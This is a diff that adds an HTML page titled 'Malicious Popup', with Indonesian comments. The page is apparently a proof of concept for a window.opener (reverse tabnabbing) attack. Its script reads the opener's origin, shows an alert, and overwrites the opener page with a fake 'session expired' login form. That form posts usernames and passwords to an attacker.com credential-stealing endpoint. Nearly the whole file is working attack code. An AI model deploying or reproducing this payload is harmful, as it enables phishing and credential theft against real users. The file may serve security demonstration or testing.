@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Malicious Popup</title>
+</head>
+<body>
+    <h1>Popup Opened</h1>
+    <script>
+        setTimeout(() => {
+            if (window.opener) {
+                // 🔥 Tampilkan sumber origin dari dokumen utama
+                document.body.innerHTML += `<h2>Origin: ${window.opener.location.origin}</h2>`;
+
+                // 🚨 Kirim alert ke dokumen utama
+                window.opener.alert("🚨 Warning: Untrusted script execution detected!");
+
+                // 🕵️‍♂️ Ganti halaman utama dengan Fake Login
+                window.opener.document.body.innerHTML = `
+                    <h1 style="color:red;">Your session has expired. Please re-login.</h1>
+                    <form action="https://attacker.com/steal-credentials" method="POST">
+                        <input type="text" name="username" placeholder="Username"><br>
+                        <input type="password" name="password" placeholder="Password"><br>
+                        <button type="submit">Login</button>
+                    </form>
+                `;
+                console.log("🚀 Exploit executed: Main document modified.");
+            } else {
+                console.log("❌ Exploit failed: No access to opener.");
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
